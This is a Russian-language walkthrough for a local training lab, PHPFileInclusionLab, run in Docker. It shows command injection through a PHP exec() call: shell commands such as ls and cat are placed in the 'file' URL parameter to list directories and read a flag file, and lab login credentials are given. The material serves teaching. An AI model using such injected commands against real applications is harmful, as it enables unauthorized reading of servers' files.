# Решение PHPFileInclusionLab


## 1. Вход в приложение

Учебное приложение опубликовано в Docker Hub. Загрузите образ:

```bash
sudo docker pull nshkilevich/phpfileinclusion-lab:latest
```

Затем запустите контейнер. Порт привязан к `127.0.0.1`, поэтому приложение доступно только на локальном компьютере:

```bash
sudo docker run -d \
  --name phpfileinclusion-lab \
  -p 127.0.0.1:8082:80 \
  nshkilevich/phpfileinclusion-lab:latest
```

Проверить состояние контейнера можно командой:

```bash
sudo docker ps
```

Запустите стенд и откройте `http://127.0.0.1:8082`.

| Поле | Значение |
|---|---|
| Логин | `student` |
| Пароль | `ctf-student-2026` |

После входа откройте страницу профиля. Поиск формирует в адресной строке параметры `search` и `file`.

## 2. Нахождение точки выполнения команды

Предполагаем, что обработчике профиля параметр `file` передаётся в `exec()`.

## 3. Исследование каталогов

Меняйте параметр `file` в URL. Адресную строку браузер кодирует сам, если вставить готовую ссылку.

Сначала посмотрите текущий каталог:

```text
http://127.0.0.1:8082/profile.php?search=web&file=ls
```

Затем поднимитесь на один уровень и выведите содержимое `/var/www/html`:

```text
http://127.0.0.1:8082/profile.php?search=web&file=ls ../
```

Поднимитесь ещё на уровень, в `/var/www`:

```text
http://127.0.0.1:8082/profile.php?search=web&file=ls ../../
```

В выводе будет каталог `private`. Посмотрите его содержимое:

```text
http://127.0.0.1:8082/profile.php?search=web&file=ls ../../private
```

Команда покажет файл `flag.txt`.

## 4. Чтение флага

Прочитайте найденный файл:

```text
http://127.0.0.1:8082/profile.php?search=web&file=cat ../../private/flag.txt
```

В блоке «Консоль справки» появится флаг.

## 5. Что произошло

Приложение добавляет значение GET-параметра в строку команды. Команды `cd` и `ls` позволили последовательно изучить файловую структуру контейнера, а `cat` — прочитать найденный учебный файл. Это command injection через PHP `exec()`.
